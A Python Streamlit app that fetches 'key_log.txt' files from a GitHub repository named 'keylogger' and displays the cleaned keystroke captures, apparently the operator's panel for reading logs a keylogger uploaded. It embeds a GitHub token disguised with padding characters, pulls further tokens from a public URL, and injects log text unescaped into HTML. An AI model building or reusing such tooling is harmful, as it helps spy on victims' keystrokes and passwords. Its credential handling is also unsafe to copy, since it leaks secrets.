import streamlit as st
import requests
import re

# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"
# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "dashboard" key exists
            if "dashboard" in token_data:
                token = token_data["dashboard"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'dashboard' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")

# Function to clean text by removing bracketed words while preserving newlines
def clean_text(input_text):
    # Regular expression to match words enclosed in square brackets
    pattern = r'\[[^\]]+\]'
    
    # Remove all occurrences of text within square brackets
    cleaned_text = re.sub(pattern, '', input_text)
    
    # Replace multiple spaces with a single space but preserve newlines
    cleaned_text = re.sub(r'[ \t]+', ' ', cleaned_text)  # Replace tabs and spaces with a single space
    cleaned_text = re.sub(r'\n\s*\n', '\n\n', cleaned_text)  # Preserve double newlines for paragraph separation
    
    return cleaned_text.strip()

# Function to split text at the stopping pattern
def split_at_stopping_pattern(text):
    # Define the stopping pattern regex
    stopping_pattern = r"^={80}\n\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} - Previous Data 👇\n={80}$"
    
    # Split the text into lines
    lines = text.splitlines()
    
    # Iterate through the lines to find the stopping pattern
    for idx in range(len(lines) - 2):  # Ensure there are enough lines to check
        # Combine three consecutive lines to check for the stopping pattern
        combined_lines = "\n".join(lines[idx:idx + 3])
        if re.fullmatch(stopping_pattern, combined_lines):
            # Truncate the text up to the line before the stopping pattern
            return "\n".join(lines[:idx]).strip()
    
    # If no stopping pattern is found, return the entire text
    return text.strip()

# Fetch files from the GitHub repository
def fetch_files_from_github():
    api_token = GITHUB_TOKEN  # Hardcoded GitHub API Token
    repo_owner = "bebedudu"
    repo_name = "keylogger"
    directory_path = "uploads/logs"
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{directory_path}"
    headers = {
        "Authorization": f"token {api_token}",
        "Accept": "application/vnd.github.v3+json"
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code != 200:
        st.error(f"Error fetching files: {response.status_code} - {response.text}")
        return []
    
    files = response.json()
    # Filter files ending with "key_log.txt"
    filtered_files = [file for file in files if file["name"].endswith("key_log.txt")]
    return filtered_files

# Fetch content of the selected file
def fetch_file_content(download_url):
    api_token = GITHUB_TOKEN  # Hardcoded GitHub API Token
    headers = {
        "Authorization": f"token {api_token}"
    }
    response = requests.get(download_url, headers=headers)
    
    if response.status_code != 200:
        st.error(f"Error fetching file content: {response.status_code} - {response.text}")
        return None
    
    return response.text

# Initialize session state
if "files" not in st.session_state:
    st.session_state.files = []
if "selected_file" not in st.session_state:
    st.session_state.selected_file = None
if "file_content" not in st.session_state:
    st.session_state.file_content = ""

# Streamlit app
def main():
    st.title("GitHub Key Log Processor")
    st.write("Select a key_log.txt file from your private GitHub repository and process its content.")

    if st.button("Fetch Files"):
        # Fetch files from GitHub
        files = fetch_files_from_github()
        if not files:
            st.error("No key_log.txt files found in the repository.")
            return
        
        # Store files in session state
        st.session_state.files = files
        st.session_state.selected_file = None  # Reset selected file
        st.success(f"Fetched {len(files)} files successfully!")

    # Display file selection dropdown if files are fetched
    if st.session_state.files:
        file_names = [file["name"] for file in st.session_state.files]
        selected_file_name = st.selectbox("Select a File", file_names)

        # Update selected file in session state
        if selected_file_name:
            st.session_state.selected_file = next(file for file in st.session_state.files if file["name"] == selected_file_name)

    # Process the selected file
    if st.session_state.selected_file:
        if st.button("Process File"):
            # Fetch the file content
            download_url = st.session_state.selected_file["download_url"]
            file_content = fetch_file_content(download_url)
            if file_content is None:
                st.error("Failed to fetch file content.")
                return
            
            # Store file content in session state
            st.session_state.file_content = file_content
            st.success("File processed successfully!")

    # Display the cleaned content
    if st.session_state.file_content:
        # Step 1: Stop processing at the stopping pattern
        truncated_content = split_at_stopping_pattern(st.session_state.file_content)
        
        # Step 2: Clean the text content
        cleaned_content = clean_text(truncated_content)
        
        # Step 3: Display the cleaned content in a styled container
        st.subheader("Cleaned Content:")
        st.markdown(
            f'<div style="background-color: #212121; padding: 10px; border: 1px solid #ddd; border-radius: 4px; max-height: 500px; overflow-y: auto;">'
            f'<pre>{cleaned_content}</pre>'
            f'</div>',
            unsafe_allow_html=True
        )

# Streamlit app
st.set_page_config(page_title="Decrypt File Contents", layout="wide", page_icon=":key:")


# app logic to authenticate user
if st.session_state["authenticated"]:
    main()
else:
    st.error("Please login (Homepage) to access this page.")

# if __name__ == "__main__":
#     main()

